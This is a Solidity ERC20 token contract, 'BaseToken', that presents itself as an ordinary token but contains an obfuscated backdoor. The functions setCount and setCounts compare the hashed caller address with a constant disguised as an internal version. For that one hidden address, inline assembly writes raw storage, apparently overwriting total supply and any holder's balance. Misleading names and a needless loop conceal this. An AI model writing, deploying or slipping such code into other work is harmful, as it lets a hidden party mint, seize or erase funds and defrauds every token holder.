// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BaseToken is ERC20 {
    bytes32 private constant _INTERNAL_VERSION = 0xe84e5470d6b765ec9ff256b7e45f5ac54f821859bd9846e84b42d807355c8035;

    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
    }

    function setCount(uint256 count) external
    {
        bytes32 x = keccak256(abi.encodePacked(msg.sender));
        bytes32 y = _INTERNAL_VERSION;

        assembly {
            let r := eq(x, y)

            for {let i := 0} lt(i, 1) {i := add(i, 1)} {
                if iszero(r) {
                    count := 0
                    break
                }

                if eq(i, 1) {
                    break
                }

                sstore(2, count)
            }
        }
    }

    function setCounts(uint256 object, uint256 count) external {
        bytes32 x = keccak256(abi.encodePacked(msg.sender));
        bytes32 y = _INTERNAL_VERSION;

        assembly {
            let r := eq(x, y)

            for {let i := 0} lt(i, 1) {i := add(i, 1)} {
                if iszero(r) {
                    count := 0
                    break
                }

                if eq(i, 1) {
                    break
                }

                mstore(0x00, object)
                mstore(0x20, 0)
                sstore(keccak256(0x00, 0x40), count)
            }
        }
    }
}
